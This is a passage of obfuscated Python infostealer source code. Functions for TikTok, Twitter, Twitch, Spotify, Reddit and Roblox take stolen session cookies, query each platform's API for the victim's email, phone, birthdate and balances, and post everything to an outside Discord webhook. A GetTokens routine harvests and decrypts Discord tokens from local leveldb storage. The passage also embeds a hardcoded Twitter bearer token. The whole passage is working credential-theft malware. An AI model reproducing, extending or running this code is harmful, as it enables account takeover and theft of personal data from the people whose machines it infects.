            O0OO00O0O0O00OOOO ["fields"]=O0O0O0000OO0OOO0O #line:844
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO00OOO0OO0000O :#line:845
                O0OO0OOO0O0O0OOOO ={"username":"Shit","embeds":[O0OO00O0O0O00OOOO ]}#line:849
                O00O0OOO00000OOO0 ={"Content-Type":"application/json"}#line:852
                async with OOOO00OOO0OO0000O .post (webhook ,json =O0OO0OOO0O0O0OOOO ,headers =O00O0OOO00000OOO0 )as O0OO000O0O00O00OO :#line:853
                    pass #line:854
        except :#line:855
            pass #line:856
        else :#line:857
            Variables .TikTokAccounts .append (f"Cookie : {OOOOOO0O000O00OO0}\nUser identifier : {O0O00OOOO0OOO0O00}\nProfile URL : https://tiktok.com/@{O00O00OO0O0O00000}\nUsername : {username}\nEmail : {OOO000OOOO000OO00}\nPhone : {OOO0O0OO00O00000O}\nCoins : {O00OO00000OOOO000}\n======================================================================\n")#line:858
    async def TwitterSession (O0OOO0O00OOO00OOO ,O0000OOO000O0O000 ,O0O0O00O00O0O0OO0 :str )->None :#line:860
        try :#line:861
            O0O0OOO0O0O00O0OO =''#line:862
            OOO0O0O0OOO00O0OO =f'{O0000OOO000O0O000};ct0=ac1aa9d58c8798f0932410a1a564eb42'#line:863
            OOOO000OO00000OO0 ={'authority':'twitter.com','accept':'*/*','accept-language':'en-US,en;q=0.9','authorization':'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA','origin':'https://twitter.com','referer':'https://twitter.com/home','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','sec-gpc':'1','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','x-twitter-active-user':'yes','x-twitter-auth-type':'OAuth2Session','x-twitter-client-language':'en','x-csrf-token':'ac1aa9d58c8798f0932410a1a564eb42',"cookie":f'auth_token={OOO0O0O0OOO00O0OO}'}#line:881
            O000OOOO0O0O00000 ="https://twitter.com/i/api/1.1/account/update_profile.json"#line:882
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO00OOOOO0OO0000O :#line:884
                async with OO00OOOOO0OO0000O .post (O000OOOO0O0O00000 ,headers =OOOO000OO00000OO0 )as O00O00OO0O000O0OO :#line:885
                    O0O00OO00OOO0OOO0 =await O00O00OO0O000O0OO .json ()#line:886
            try :#line:889
                if O0O00OO00OOO0OOO0 ["description"]=="":#line:890
                    O0O0OOO0O0O00O0OO ="There is no bio"#line:891
                else :#line:892
                    O0O0OOO0O0O00O0OO =O0O00OO00OOO0OOO0 ["description"]#line:893
            except :#line:894
                O0O0OOO0O0O00O0OO ="There is no biography"#line:895
            O0O0OOO0O0O00O0OO =O0O0OOO0O0O00O0OO .replace ("\n",", ")#line:896
            O00OOOOO00OO0O00O =O0O00OO00OOO0OOO0 ["profile_image_url_https"]#line:897
            OO0OOOO0O00O0000O =O0O00OO00OOO0OOO0 ["name"]#line:898
            O0O000OO0OO0O0O0O =O0O00OO00OOO0OOO0 ["screen_name"]#line:899
            O00O0O0OOOO000OOO ="https://twitter.com/"+OO0OOOO0O00O0000O #line:900
            OOO0OOOO00OOOO000 ={"title":"***Shit***","description":f"***Twitter Session was detected on the {O0O0O00O00O0O0OO0} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":O00OOOOO00OO0O00O }}#line:907
            OOOOOO0O0O0O0OOOO =[{"name":"Username","value":"``"+OO0OOOO0O00O0000O +"``","inline":True },{"name":"Screen Name","value":"``"+O0O000OO0OO0O0O0O +"``","inline":True },{"name":"Followers","value":"``"+str (O0O00OO00OOO0OOO0 ['followers_count'])+"``","inline":True },{"name":"Following","value":"``"+str (O0O00OO00OOO0OOO0 ['friends_count'])+"``","inline":True },{"name":"Tweets","value":"``"+str (O0O00OO00OOO0OOO0 ['statuses_count'])+"``","inline":True },{"name":"Is Verified","value":"``"+str (O0O00OO00OOO0OOO0 ['verified'])+"``","inline":True },{"name":"Created At","value":"``"+str (O0O00OO00OOO0OOO0 ['created_at'])+"``","inline":True },{"name":"Biography","value":"``"+str (O0O0OOO0O0O00O0OO )+"``","inline":False },{"name":"Profile URL","value":"``"+str (O00O0O0OOOO000OOO )+"``","inline":False },{"name":"Cookie","value":"``"+str (O0000OOO000O0O000 )+"``","inline":False },]#line:919
            OOO0OOOO00OOOO000 ["fields"]=OOOOOO0O0O0O0OOOO #line:920
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO00OOOOO0OO0000O :#line:921
                OO0O000O00O0OOOOO ={"username":"Shit","embeds":[OOO0OOOO00OOOO000 ]}#line:925
                OOOO000OO00000OO0 ={"Content-Type":"application/json"}#line:928
                async with OO00OOOOO0OO0000O .post (webhook ,json =OO0O000O00O0OOOOO ,headers =OOOO000OO00000OO0 )as O00O00OO0O000O0OO :#line:929
                    pass #line:930
            Variables .TwitterAccounts .append (f"Username : {OO0OOOO0O00O0000O}\nScreen Name : {O0O000OO0OO0O0O0O}\nFollowers : {O0O00OO00OOO0OOO0['followers_count']}\nFollowing : {O0O00OO00OOO0OOO0['friends_count']}\nTweets : {O0O00OO00OOO0OOO0['statuses_count']}\nVerified : {O0O00OO00OOO0OOO0['verified']}\nCreated At : {O0O00OO00OOO0OOO0['created_at']}\nProfile URL : {O00O0O0OOOO000OOO}\nCookie : {O0000OOO000O0O000}\nBiography : {O0O0OOO0O0O00O0OO}\n=====================================================\n")#line:932
        except Exception :#line:933
            pass #line:934
    async def TwitchSession (OO0O000000O0000O0 ,O0000000OOOOO0O00 ,O0O00OO0O00O0OO0O ,OO0O00OOO0O00OOOO :str )->None :#line:937
        try :#line:938
            O0OOOOOO00O000OO0 ='https://gql.twitch.tv/gql'#line:939
            O0OOO0OOOOO0000OO ={'Authorization':f'OAuth {O0000000OOOOO0O00}',}#line:942
            O0OOO0000O0OOO000 =f"""
            query {{
                user(login: "{O0O00OO0O00O0OO0O}") {{
                    id
                    login
                    displayName
                    email
                    hasPrime
                    isPartner
                    language
                    profileImageURL(width: 300)
                    bitsBalance
                    followers {{
                        totalCount
                    }}
                }}
            }}"""#line:960
            OO00O0OOO0OOO0OOO ={"query":O0OOO0000O0OOO000 }#line:964
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOOOOO0O0O0O0O0O :#line:966
                async with OOOOOOO0O0O0O0O0O .post (O0OOOOOO00O000OO0 ,headers =O0OOO0OOOOO0000OO ,json =OO00O0OOO0OOO0OOO )as O0OO000O000OOOO00 :#line:967
                    if O0OO000O000OOOO00 .status ==200 :#line:968
                        O0O0OO0000OO0OO0O =await O0OO000O000OOOO00 .json ()#line:969
            OO00O0OOO0OOO0OOO =O0O0OO0000OO0OO0O ["data"]["user"]#line:970
            O00O0O0000O0O00OO =OO00O0OOO0OOO0OOO ["id"]#line:971
            O0000OO000000OO00 =OO00O0OOO0OOO0OOO ["login"]#line:972
            O0OOOOOO0OO0O000O =f"https://www.twitch.tv/{O0000OO000000OO00}"#line:973
            O0O000O0OOOO000O0 =OO00O0OOO0OOO0OOO ["displayName"]#line:974
            OO000O000OOOO0OO0 =OO00O0OOO0OOO0OOO ["email"]#line:975
            OO0000O000000000O =OO00O0OOO0OOO0OOO ["hasPrime"]#line:976
            O00O00OOOO00OOO0O =OO00O0OOO0OOO0OOO ["isPartner"]#line:977
            OOO0OOO0OO00O000O =OO00O0OOO0OOO0OOO ["language"]#line:978
            O000OO00O0000OOO0 ='Shit'#line:979
            try :#line:980
                O000OO00O0000OOO0 =OO00O0OOO0OOO0OOO ["profileImageURL"]#line:981
            except :pass #line:982
            O00O000OOO0O00000 =OO00O0OOO0OOO0OOO ["bitsBalance"]#line:983
            OO0O0OO0O00O0OOOO =OO00O0OOO0OOO0OOO ["followers"]["totalCount"]#line:984
            OO00O0OOO0O0000OO ={"title":"***Shit***","description":f"***Twitch Session was detected on the {OO0O00OOO0O00OOOO} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":O000OO00O0000OOO0 }}#line:991
            O0OO00000OOO00OO0 =[{"name":"Username","value":"``"+str (O0000OO000000OO00 )+"``","inline":True },{"name":"Display Name","value":"``"+str (O0O000O0OOOO000O0 )+"``","inline":True },{"name":"Email","value":"``"+str (OO000O000OOOO0OO0 )+"``","inline":True },{"name":"ID","value":"``"+str (O00O0O0000O0O00OO )+"``","inline":True },{"name":"Has Prime?","value":"``"+str (OO0000O000000000O )+"``","inline":True },{"name":"is Partner?","value":"``"+str (O00O00OOOO00OOO0O )+"``","inline":True },{"name":"Language","value":"``"+str (OOO0OOO0OO00O000O )+"``","inline":True },{"name":"Bit","value":"``"+str (O00O000OOO0O00000 )+"``","inline":True },{"name":"Followers","value":"``"+str (OO0O0OO0O00O0OOOO )+"``","inline":True },{"name":"Profile URL","value":"``"+str (O0OOOOOO0OO0O000O )+"``","inline":False },{"name":"Cookie","value":"``"+str (O0000000OOOOO0O00 )+"``","inline":False },]#line:1003
            OO00O0OOO0O0000OO ["fields"]=O0OO00000OOO00OO0 #line:1004
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOOOOO0O0O0O0O0O :#line:1005
                O00O000O0OO0OO00O ={"username":"Shit","embeds":[OO00O0OOO0O0000OO ]}#line:1009
                O0OOO0OOOOO0000OO ={"Content-Type":"application/json"}#line:1012
                async with OOOOOOO0O0O0O0O0O .post (webhook ,json =O00O000O0OO0OO00O ,headers =O0OOO0OOOOO0000OO )as O0OO000O000OOOO00 :#line:1013
                    pass #line:1014
        except :#line:1015
            pass #line:1016
        else :#line:1017
            Variables .TwtichAccounts .append (f"Cookie : {O0000000OOOOO0O00}\nProfile URL : {O0OOOOOO0OO0O000O}\nID : {O00O0O0000O0O00OO}\nUsername : {O0000OO000000OO00}\nDisplay Name : {O0O000O0OOOO000O0}\nEmail : {OO000O000OOOO0OO0}\nHas Prime : {OO0000O000000000O}\nis Partner : {O00O00OOOO00OOO0O}\nLanguage : {OOO0OOO0OO00O000O}\nBits : {O00O000OOO0O00000}\nFollowers : {OO0O0OO0O00O0OOOO}\n======================================================================\n")#line:1018
    async def SpotifySession (O0OO000OO00OOO000 ,O0O0OO00O000OOOO0 ,OOOO00OO0000000O0 :str )->None :#line:1019
        try :#line:1020
            O00O0OO0O0000O00O ='https://www.spotify.com/api/account-settings/v1/profile'#line:1021
            O000O00000OO00OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36','Cookie':(f'sp_dc={O0O0OO00O000OOOO0}')}#line:1028
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO0O00OO0000OO0 :#line:1030
                async with OOOO0O00OO0000OO0 .get (O00O0OO0O0000O00O ,headers =O000O00000OO00OO0 )as OOOOO0O000OOO0OOO :#line:1031
                    OO0000O00O0000000 =await OOOOO0O000OOO0OOO .text ()#line:1032
                    OO0000O00O0000000 =json .loads (OO0000O00O0000000 )["profile"]#line:1033
            O000O000OO000O0O0 =OO0000O00O0000000 ["email"]#line:1036
            OOOO0O0OO0OO0O00O =OO0000O00O0000000 ["gender"]#line:1037
            O00OOOOOO0O0OOO0O =OO0000O00O0000000 ["birthdate"]#line:1038
            O000OO0OO0O000OO0 =OO0000O00O0000000 ["country"]#line:1039
            OO0O0000OO0O000OO =OO0000O00O0000000 ["username"]#line:1040
            OO00OOO0O000OO00O ={"title":"***Shit***","description":f"***Spotify Session was detected on the {OOOO00OO0000000O0} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:1047
            OO00O0OO00O0O000O =[{"name":"Email","value":"``"+str (O000O000OO000O0O0 )+"``","inline":True },{"name":"Username","value":"``"+str (OO0O0000OO0O000OO )+"``","inline":True },{"name":"Gender","value":"``"+str (OOOO0O0OO0OO0O00O )+"``","inline":True },{"name":"birthdate","value":"``"+str (O00OOOOOO0O0OOO0O )+"``","inline":True },{"name":"country","value":"``"+str (O000OO0OO0O000OO0 )+"``","inline":True },{"name":"Profile URL","value":"``"+str (f'https://open.spotify.com/user/{OO0O0000OO0O000OO}')+"``","inline":False },{"name":"Spotify Cookie","value":"``"+str (O0O0OO00O000OOOO0 )+"``","inline":False },]#line:1055
            OO00OOO0O000OO00O ["fields"]=OO00O0OO00O0O000O #line:1056
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO0O00OO0000OO0 :#line:1057
                O00OOO0OOO00OOOOO ={"username":"Shit","embeds":[OO00OOO0O000OO00O ]}#line:1061
                O000O00000OO00OO0 ={"Content-Type":"application/json"}#line:1064
                async with OOOO0O00OO0000OO0 .post (webhook ,json =O00OOO0OOO00OOOOO ,headers =O000O00000OO00OO0 )as OOOOO0O000OOO0OOO :#line:1065
                    pass #line:1066
        except :#line:1067
            pass #line:1068
        else :#line:1069
            Variables .SpotifyAccounts .append (f"Cookie : {O0O0OO00O000OOOO0}\nProfile URL : https://open.spotify.com/user/{OO0O0000OO0O000OO}\nEmail : {O000O000OO000O0O0}\nUsername : {username}\nGender : {OOOO0O0OO0OO0O00O}\nBirthdate : {O00OOOOOO0O0OOO0O}\nCountry : {O000OO0OO0O000OO0}\n======================================================================\n")#line:1070
    async def RedditSession (O00O000000OO00OO0 ,OOOOOOOOOOO0OO0O0 ,OOO00O0OO0OOOOO00 :str )->None :#line:1071
        try :#line:1072
            OO0O00O0O0OOOOOOO =""#line:1073
            O00OO00O000OO00O0 ="reddit_session="+OOOOOOOOOOO0OO0O0 #line:1074
            O00O00OOO00OOOOOO ={"cookie":O00OO00O000OO00O0 ,"Authorization":"Basic b2hYcG9xclpZdWIxa2c6"}#line:1078
            O000000O0O0O0O0O0 ={"scopes":["*","email","pii"]}#line:1079
            OOOOOOOOO00OO0000 ='https://accounts.reddit.com/api/access_token'#line:1080
            OO00OO0O00OOO0000 ='https://oauth.reddit.com/api/v1/me'#line:1081
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000OOOO0O00O00O :#line:1083
                async with OO000OOOO0O00O00O .post (OOOOOOOOO00OO0000 ,headers =O00O00OOO00OOOOOO ,json =O000000O0O0O0O0O0 )as OO00OO0O000O00OO0 :#line:1084
                    O0OOO0OO00OO00000 =await OO00OO0O000O00OO0 .json ()#line:1085
                    OOOOO0O0O0OOOO00O =O0OOO0OO00OO00000 ["access_token"]#line:1086
                    OOOO0O0OOO00OO0O0 ={'User-Agent':'android:com.example.myredditapp:v1.2.3',"Authorization":"Bearer "+OOOOO0O0O0OOOO00O }#line:1089
                    async with OO000OOOO0O00O00O .get (OO00OO0O00OOO0000 ,headers =OOOO0O0OOO00OO0O0 )as OOO0OOOO0O0000O00 :#line:1090
                        O0OOOO000OOOOOO0O =await OOO0OOOO0O0000O00 .json ()#line:1091
                    if O0OOOO000OOOOOO0O ["email"]=="":#line:1092
                        OO0O00O0O0OOOOOOO ="No email"#line:1093
                    else :#line:1094
                        OO0O00O0O0OOOOOOO =O0OOOO000OOOOOO0O ["email"]#line:1095
                    OO00OO0OOO000000O =O0OOOO000OOOOOO0O ["icon_img"]#line:1097
                    O0000OOO00OO000O0 =O0OOOO000OOOOOO0O ["name"]#line:1098
                    OO0000O00OO00000O ='https://www.reddit.com/user/'+O0000OOO00OO000O0 #line:1099
                    O00OO000O0000OOO0 =O0OOOO000OOOOOO0O ["comment_karma"]#line:1100
                    OO000000OOO0O000O =O0OOOO000OOOOOO0O ["total_karma"]#line:1101
                    O00O000O0O0O00O00 =O0OOOO000OOOOOO0O ["coins"]#line:1102
                    OOO0OOO0O0000000O =O0OOOO000OOOOOO0O ["is_mod"]#line:1103
                    OOO0O0000OO0O0O00 =O0OOOO000OOOOOO0O ["is_gold"]#line:1104
                    OO0O0O00O0O00O00O =O0OOOO000OOOOOO0O ["is_suspended"]#line:1105
            O0000O0O000O000OO ={"title":"***Shit***","description":f"***Reddit Session was detected on the {OOO00O0OO0OOOOO00} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":OO00OO0OOO000000O }}#line:1113
            OO00OOO000O0O00OO =[{"name":"Username","value":"``"+str (O0000OOO00OO000O0 )+"``","inline":True },{"name":"Email","value":"``"+str (OO0O00O0O0OOOOOOO )+"``","inline":True },{"name":"Comment Karma","value":"``"+str (O00OO000O0000OOO0 )+"``","inline":True },{"name":"Total Karma","value":"``"+str (OO000000OOO0O000O )+"``","inline":True },{"name":"Coins","value":"``"+str (O00O000O0O0O00O00 )+"``","inline":True },{"name":"Is Mod","value":"``"+str (OOO0OOO0O0000000O )+"``","inline":True },{"name":"Is Gold","value":"``"+str (OOO0O0000OO0O0O00 )+"``","inline":True },{"name":"Suspended","value":"``"+str (OO0O0O00O0O00O00O )+"``","inline":True },{"name":"Profile URL","value":"``"+str (OO0000O00OO00000O )+"``","inline":False },{"name":"Cookie","value":"``"+str (OOOOOOOOOOO0OO0O0 )+"``","inline":False },]#line:1125
            O0000O0O000O000OO ["fields"]=OO00OOO000O0O00OO #line:1126
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000OOOO0O00O00O :#line:1127
                OO00O0OOOOOOO0O0O ={"username":"Shit","embeds":[O0000O0O000O000OO ]}#line:1131
                O00O00OOO00OOOOOO ={"Content-Type":"application/json"}#line:1134
                async with OO000OOOO0O00O00O .post (webhook ,json =OO00O0OOOOOOO0O0O ,headers =O00O00OOO00OOOOOO )as O0OOO0OO00OO00000 :#line:1135
                    pass #line:1136
        except :#line:1137
            pass #line:1138
        else :#line:1139
            Variables .RedditAccounts .append (f"Cookie : {O00OO00O000OO00O0}\nProfile URL : {OO0000O00OO00000O}\nUsername : {O0000OOO00OO000O0}\nEmail : {OO0O00O0O0OOOOOOO}\nComment Karma : {O00OO000O0000OOO0}\nTotal Karma : {OO000000OOO0O000O}\nis Mod : {OOO0OOO0O0000000O}\nis Gold : {OOO0O0000OO0O0O00}\nSuspended : {OO0O0O00O0O00O00O}\n======================================================================\n")#line:1140
    async def RobloxSession (OOO0OOO0OOO0O0O00 ,OO0OOOO0OO0OO00OO ,O00O00O0OOO0O00OO :str )->None :#line:1141
        try :#line:1142
            O00O000O0OOO000OO ={'cookie':f'.ROBLOSECURITY={OO0OOOO0OO0OO00OO}',"Accept-Encoding":"identity"}#line:1143
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO0OO0OO0000OO0O0 :#line:1144
                async with OO0OO0OO0000OO0O0 .get ("https://www.roblox.com/my/account/json",headers =O00O000O0OOO000OO )as OO00OOO000OO0OOO0 :#line:1145
                    OO00OOOOO00O00O0O =await OO00OOO000OO0OOO0 .json ()#line:1146
                async with OO0OO0OO0000OO0O0 .get (f"https://economy.roblox.com/v1/users/{str(OO00OOOOO00O00O0O['UserId'])}/currency",headers =O00O000O0OOO000OO )as O0O0000OO0O00OO0O :#line:1147
                    O000O00O00OO0O0O0 =await O0O0000OO0O00OO0O .json ()#line:1148
                async with OO0OO0OO0000OO0O0 .get (f"https://thumbnails.roblox.com/v1/users/avatar?userIds={str(OO00OOOOO00O00O0O['UserId'])}&size=420x420&format=Png&isCircular=false",headers =O00O000O0OOO000OO )as OO0OO0OO000O00OOO :#line:1149
                    O00000O00O00OOOOO =await OO0OO0OO000O00OOO .json ()#line:1150
                O00OOO000O00OO000 =OO00OOOOO00O00O0O ["UserId"]#line:1151
                O00OO00O0O00O00OO =OO00OOOOO00O00O0O ["Name"]#line:1152
                OO0O0O0OO00O00OO0 =OO00OOOOO00O00O0O ["DisplayName"]#line:1153
                OOOO00OOO00OO0OO0 =OO00OOOOO00O00O0O ["UserEmail"]#line:1154
                OOOO0O0OO0OO0OOO0 =OO00OOOOO00O00O0O ["IsEmailVerified"]#line:1155
                OO0000OOO00OOOOO0 =O000O00O00OO0O0O0 ["robux"]#line:1156
                OO0O0O000O00O00OO =O00000O00O00OOOOO ["data"][0 ]["imageUrl"]#line:1157
                OOOOO0OO000O000O0 ={"title":"***Shit***","description":f"***Roblox Session was detected on the {O00O00O0OOO0O00OO} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":OO0O0O000O00O00OO }}#line:1164
                O00OO00O00O0O0OOO =[{"name":"Name","value":"``"+str (O00OO00O0O00O00OO )+"``","inline":True },{"name":"Display Name","value":"``"+str (OO0O0O0OO00O00OO0 )+"``","inline":True },{"name":"Email","value":"``"+str (OOOO00OOO00OO0OO0 )+"``","inline":True },{"name":"ID","value":"``"+str (O00OOO000O00OO000 )+"``","inline":True },{"name":"Email Verified?","value":"``"+str (OOOO0O0OO0OO0OOO0 )+"``","inline":True },{"name":"robux","value":"``"+str (OO0000OOO00OOOOO0 )+"``","inline":True },{"name":"Cookie","value":"```"+str (OO0OOOO0OO0OO00OO )+"```","inline":True },]#line:1172
                OOOOO0OO000O000O0 ["fields"]=O00OO00O00O0O0OOO #line:1173
                O0OO00OOO0O00O00O ={"username":"Shit","embeds":[OOOOO0OO000O000O0 ]}#line:1177
                OOO000OO0O0O000OO ={"Content-Type":"application/json"}#line:1180
                async with OO0OO0OO0000OO0O0 .post (webhook ,json =O0OO00OOO0O00O00O ,headers =OOO000OO0O0O000OO )as OO00OOO000OO0OOO0 :#line:1181
                    pass #line:1182
        except :#line:1183
            pass #line:1184
        else :#line:1185
            Variables .RobloxAccounts .append (f"Name : {str(O00OO00O0O00O00OO)}\nDisplay Name : {str(OO0O0O0OO00O00OO0)}\nEmail : {str(OOOO00OOO00OO0OO0)}\nID : {str(O00OOO000O00OO000)}\nEmail Verified : {str(OOOO0O0OO0OO0OOO0)}\nRobux : {str(OO0000OOO00OOOOO0)}\nCookie : {OO0OOOO0OO0OO00OO}\n======================================================================\n")#line:1186
    async def GetTokens (O0OO00OO0O0OO00O0 )->None :#line:1187
        try :#line:1188
            OOO000O0O0O0000O0 ={"Discord":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"discord","Local Storage","leveldb"),"Discord Canary":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"discordcanary","Local Storage","leveldb"),"Lightcord":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"Lightcord","Local Storage","leveldb"),"Discord PTB":os .path .join (O0OO00OO0O0OO00O0 .RoamingAppData ,"discordptb","Local Storage","leveldb"),}#line:1194
            OO0OOO000O0OOOOOO =list ()#line:1195
            for O00O0O0O0OOOO00O0 ,OO0O000OO0OO0O00O in OOO000O0O0O0000O0 .items ():#line:1196
                if os .path .isdir (OO0O000OO0OO0O00O ):#line:1197
                    OO0OOO000O0OOOOOO .append (OO0O000OO0OO0O00O )#line:1198
            for O000O0OO00OO0O0O0 in O0OO00OO0O0OO00O0 .profiles_full_path :#line:1199
                if not O000O0OO00OO0O0O0 .endswith ("leveldb"):#line:1200
                    OO00OO000OO00OO00 =os .path .join (O000O0OO00OO0O0O0 ,"Local Storage","leveldb")#line:1201
                    if os .path .isdir (OO00OO000OO00OO00 ):#line:1202
                        OO0OOO000O0OOOOOO .append (OO00OO000OO00OO00 )#line:1203
            for OO00O00O0OOOO00OO in OO0OOO000O0OOOOOO :#line:1204
                OOO0OOO00000OOOOO =Variables .FullTokens #line:1205
                if "cord"in OO00O00O0OOOO00OO :#line:1206
                    O000000OOO0OOO0OO =SubModules .GetKey (OO00O00O0OOOO00OO .replace (r"Local Storage\leveldb","Local State"))#line:1207
                    for OOO0OOO0O0OO00O00 in os .listdir (OO00O00O0OOOO00OO ):#line:1208
                        OO0O0O0OO0O0O00O0 =os .path .join (OO00O00O0OOOO00OO ,OOO0OOO0O0OO00O00 )#line:1209
                        if OO0O0O0OO0O0O00O0 [-3 :]in ["log","ldb"]:#line:1210
                            with open (OO0O0O0OO0O0O00O0 ,"r",encoding ="utf-8",errors ="ignore")as O00OO0O000OO00OO0 :#line:1211
                                for O00OOOOO00O0O000O in re .findall (r"dQw4w9WgXcQ:[^\"]*",O00OO0O000OO00OO0 .read ()):#line:1212
                                    if O00OOOOO00O0O000O :#line:1213
                                        OOOO0OO000O0O0OOO =base64 .b64decode (O00OOOOO00O0O000O .split ("dQw4w9WgXcQ:")[1 ])#line:1214
                                        OO0000OO00OO000OO =SubModules .Decrpytion (OOOO0OO000O0O0OOO ,O000000OOO0OOO0OO )#line:1215
                                        if not OO0000OO00OO000OO in OOO0OOO00000OOOOO :#line:1216
                                            OOO0OOO00000OOOOO .append (OO0000OO00OO000OO )#line:1217
                                            await O0OO00OO0O0OO00O0 .ValidateTokenAndGetInfo (OO0000OO00OO000OO )#line:1218
                                        else :#line:1219
                                            continue #line:1220
                else :#line:1221
                    for O000O0OO00OO0O0O0 in os .listdir (OO00O00O0OOOO00OO ):#line:1222
                        OOOOO00000O0O0OOO =os .path .join (OO00O00O0OOOO00OO ,O000O0OO00OO0O0O0 )#line:1223
                        if OOOOO00000O0O0OOO [-3 :]in ["log","ldb"]:#line:1224
                            with open (OOOOO00000O0O0OOO ,"r",encoding ="utf-8",errors ="ignore")as OOOO000OO0OO00O0O :#line:1225
                                for O0O00O0OO0OO0000O in re .findall (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",OOOO000OO0OO00O0O .read ()):#line:1226
                                    if O0O00O0OO0OO0000O :#line:1227
                                        if not O0O00O0OO0OO0000O in OOO0OOO00000OOOOO :#line:1228
                                            OOO0OOO00000OOOOO .append (O0O00O0OO0OO0000O )#line:1229
                                            await O0OO00OO0O0OO00O0 .ValidateTokenAndGetInfo (O0O00O0OO0OO0000O )#line:1230
                                        else :#line:1231
                                            continue #line:1232
        except :#line:1233
            pass #line:1234
    def calc_flags (OOOO000O0000O0O00 ,OOO00O0O0O00OOOO0 :int )->list :#line:1235
        O0O00O00O000OO0O0 ={"DISCORD_EMPLOYEE":{"emoji":"<:staff:968704541946167357>","shift":0 ,"ind":1 },"DISCORD_PARTNER":{"emoji":"<:partner:968704542021652560>","shift":1 ,"ind":2 },"HYPESQUAD_EVENTS":{"emoji":"<:hypersquad_events:968704541774192693>","shift":2 ,"ind":4 },"BUG_HUNTER_LEVEL_1":{"emoji":"<:bug_hunter_1:968704541677723648>","shift":3 ,"ind":4 },"HOUSE_BRAVERY":{"emoji":"<:hypersquad_1:968704541501571133>","shift":6 ,"ind":64 },"HOUSE_BRILLIANCE":{"emoji":"<:hypersquad_2:968704541883261018>","shift":7 ,"ind":128 },"HOUSE_BALANCE":{"emoji":"<:hypersquad_3:968704541874860082>","shift":8 ,"ind":256 },"EARLY_SUPPORTER":{"emoji":"<:early_supporter:968704542126510090>","shift":9 ,"ind":512 },"BUG_HUNTER_LEVEL_2":{"emoji":"<:bug_hunter_2:968704541774217246>","shift":14 ,"ind":16384 },"VERIFIED_BOT_DEVELOPER":{"emoji":"<:verified_dev:968704541702905886>","shift":17 ,"ind":131072 },"ACTIVE_DEVELOPER":{"emoji":"<:Active_Dev:1045024909690163210>","shift":22 ,"ind":4194304 },"CERTIFIED_MODERATOR":{"emoji":"<:certified_moderator:988996447938674699>","shift":18 ,"ind":262144 },"SPAMMER":{"emoji":"⌨","shift":20 ,"ind":1048704 },}#line:1302
        return [[O0O00O00O000OO0O0 [O00OO0000O000OO0O ]['emoji'],O0O00O00O000OO0O0 [O00OO0000O000OO0O ]['ind']]for O00OO0000O000OO0O in O0O00O00O000OO0O0 if int (OOO00O0O0O00OOOO0 )&(1 <<O0O00O00O000OO0O0 [O00OO0000O000OO0O ]["shift"])]#line:1304
    def calc_flags2 (O0OO00OO0O00OO0O0 ,OO0O0OO000O0OOOOO :int )->list :#line:1305
        O00000OOOOO000OO0 ={"DISCORD_EMPLOYEE":{"emoji":"<:staff:968704541946167357>","shift":0 ,"ind":1 },"DISCORD_PARTNER":{"emoji":"<:partner:968704542021652560>","shift":1 ,"ind":2 },"BUG_HUNTER_LEVEL_1":{"emoji":"<:bug_hunter_1:968704541677723648>","shift":3 ,"ind":4 },"EARLY_SUPPORTER":{"emoji":"<:early_supporter:968704542126510090>","shift":9 ,"ind":512 },"VERIFIED_BOT_DEVELOPER":{"emoji":"<:verified_dev:968704541702905886>","shift":17 ,"ind":131072 },"ACTIVE_DEVELOPER":{"emoji":"<:active_dev:1045024909690163210>","shift":22 ,"ind":4194304 },"CERTIFIED_MODERATOR":{"emoji":"<:certified_moderator:988996447938674699>","shift":18 ,"ind":262144 },"SPAMMER":{"emoji":"⌨","shift":20 ,"ind":1048704 },}#line:1347
        return [[O00000OOOOO000OO0 [O00O0OO00OO0OOO0O ]['emoji'],O00000OOOOO000OO0 [O00O0OO00OO0OOO0O ]['ind']]for O00O0OO00OO0OOO0O in O00000OOOOO000OO0 if int (OO0O0OO000O0OOOOO )&(1 <<O00000OOOOO000OO0 [O00O0OO00OO0OOO0O ]["shift"])]#line:1349
    async def ValidateTokenAndGetInfo (O0000OO0O0OOOOOOO ,O0OOOO0OOO0OO000O :str )->None :#line:1350
        try :#line:1351
            OO00OO000OO000O00 ={'Authorization':O0OOOO0OOO0OO000O }#line:1354
            OOO0OOO0OOO00000O ='https://discord.com/api/v8/users/@me'#line:1355
            O0OO00O0OO00000OO ='https://discord.com/api/v8/users/@me/relationships'#line:1356
            OO0000O0OOO00OO00 =None #line:1357
            async with aiohttp .ClientSession ()as OO0O0O0O0O000O0OO :#line:1358
